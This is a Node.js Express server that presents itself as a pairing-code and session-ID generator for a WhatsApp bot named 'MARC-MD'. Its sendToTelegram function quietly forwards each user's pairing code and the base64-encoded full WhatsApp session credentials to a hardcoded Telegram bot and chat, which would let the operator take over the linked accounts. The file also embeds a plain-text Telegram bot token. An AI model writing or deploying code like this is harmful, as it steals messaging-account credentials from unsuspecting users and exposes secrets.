import baileys from "@whiskeysockets/baileys";
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    DisconnectReason 
} = baileys;

import express from "express";
import pino from "pino";
import fs from "fs-extra";
import axios from 'axios';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 8000;

// Configuration
const BOT_NAME = "MARC-MD";
const TELEGRAM_TOKEN = "8763281107:AAHk2UTQjqIGR28zjWXX8w7A0-1MHRPXXrc";
const TELEGRAM_CHAT_ID = "7779604777";

// Middleware to handle JSON and cross-origin requests
app.use(express.json());

// Serving the home.html from root
app.get('/', (req, res) => {
    const homePath = path.join(__dirname, 'home.html');
    if (fs.existsSync(homePath)) {
        res.sendFile(homePath);
    } else {
        res.status(404).send("Error: home.html not found in main directory.");
    }
});

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
    } catch (e) {
        console.error("Telegram Notification Error");
    }
}

async function startSession(phoneNumber, res) {
    const sessionDir = path.join(__dirname, 'sessions', `session_${Date.now()}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const socket = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        browser: ["MARC-MD", "Chrome", "1.0.0"]
    });

    if (phoneNumber && !socket.authState.creds.registered) {
        const cleanNumber = phoneNumber.replace(/[^0-9]/g, ''); 
        try {
            await delay(3000); 
            const code = await socket.requestPairingCode(cleanNumber);
            
            // Sending the code back to the website
            if (res && !res.headersSent) {
                res.status(200).json({ code });
            }
            
            sendToTelegram(`🚀 *Pairing Code:* \`${code}\` for \`${cleanNumber}\``);
        } catch (err) {
            console.error("Pairing Request Failed", err);
            if (res && !res.headersSent) res.status(500).json({ error: "Failed to fetch code" });
        }
    }

    socket.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
            const sessionBase64 = Buffer.from(JSON.stringify(state.creds)).toString("base64");
            const sessionId = `MARC-MD~${sessionBase64}`;
            
            await socket.sendMessage(socket.user.id, { text: sessionId });
            sendToTelegram(`✅ *Session Active:* ${phoneNumber}\nID: \`${sessionId}\``);
            
            await delay(5000);
            socket.end();
            fs.removeSync(sessionDir);
        }
        
        if (connection === "close") {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason === DisconnectReason.loggedOut) {
                fs.removeSync(sessionDir);
            }
        }
    });

    socket.ev.on("creds.update", saveCreds);
}

// API Endpoint
app.get("/get-code", async (req, res) => {
    const { number } = req.query;
    if (!number) return res.status(400).json({ error: "Number is required" });
    
    try {
        await startSession(number, res);
    } catch (e) {
        if (!res.headersSent) res.status(500).json({ error: "Internal Server Error" });
    }
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 MARC-MD Professional Server running on port ${PORT}`);
});
